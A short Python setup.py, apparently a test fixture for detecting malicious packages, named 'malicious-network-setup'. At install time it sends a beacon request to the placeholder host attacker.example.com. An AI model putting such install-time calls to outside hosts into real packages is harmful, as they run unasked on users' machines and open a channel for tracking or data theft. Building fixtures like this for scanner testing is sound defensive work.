import urllib.request

from setuptools import setup

urllib.request.urlopen("http://attacker.example.com/beacon")

setup(name="malicious-network-setup", version="1.0.0")
